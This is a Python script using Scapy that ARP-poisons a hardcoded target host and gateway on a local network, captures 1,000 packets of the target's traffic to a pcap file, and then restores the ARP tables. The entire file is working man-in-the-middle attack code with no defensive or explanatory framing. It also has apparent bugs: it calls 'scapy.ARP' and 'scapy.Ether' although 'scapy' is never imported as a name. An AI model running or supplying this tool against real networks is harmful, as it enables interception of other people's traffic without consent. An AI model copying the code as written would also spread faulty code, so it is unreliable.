from scapy.all import *
import os
import sys
import threading
import time
import signal

# Configuration
interface = "en1"  # Change to your real interface like 'eth0' or 'wlan0'
target_ip = "172.16.1.71"
gateway_ip = "172.16.1.254"
packet_count = 1000

# Set interface and suppress Scapy output
conf.iface = interface
conf.verb = 0

print(f"[*] Setting up on interface {interface}")

# === Helper Functions ===

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """Restore target and gateway to original MAC mappings"""
    print("[*] Restoring target...")

    send(scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)

    send(scapy.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    os.kill(os.getpid(), signal.SIGINT)  # Gracefully exit

def get_mac(ip_address):
    """Get MAC address for an IP"""
    answered, _ = srp(
        scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_address),
        timeout=2,
        retry=10,
        verbose=False
    )
    for sent, received in answered:
        return received[scapy.Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """Continuously send ARP poison packets"""
    poison_target = scapy.ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = scapy.ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")
    try:
        while True:
            send(poison_target, verbose=False)
            send(poison_gateway, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[*] ARP poison attack finished.")
        return

# === Get MAC addresses ===

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print(f"[*] Gateway {gateway_ip} is at {gateway_mac}")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print(f"[*] Target {target_ip} is at {target_mac}")

# === Start ARP Poison Thread ===

poison_thread = threading.Thread(
    target=poison_target,
    args=(gateway_ip, gateway_mac, target_ip, target_mac)
)
poison_thread.start()

# === Sniff Packets ===

try:
    print(f"[*] Starting sniffer for {packet_count} packets...")
    bpf_filter = f"ip host {target_ip}"
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    
    # Save sniffed packets
    wrpcap("arper.pcap", packets)
    print("[*] Packets saved to arper.pcap")

    # Clean up
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    print("\n[!] Ctrl-C detected. Restoring network...")
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
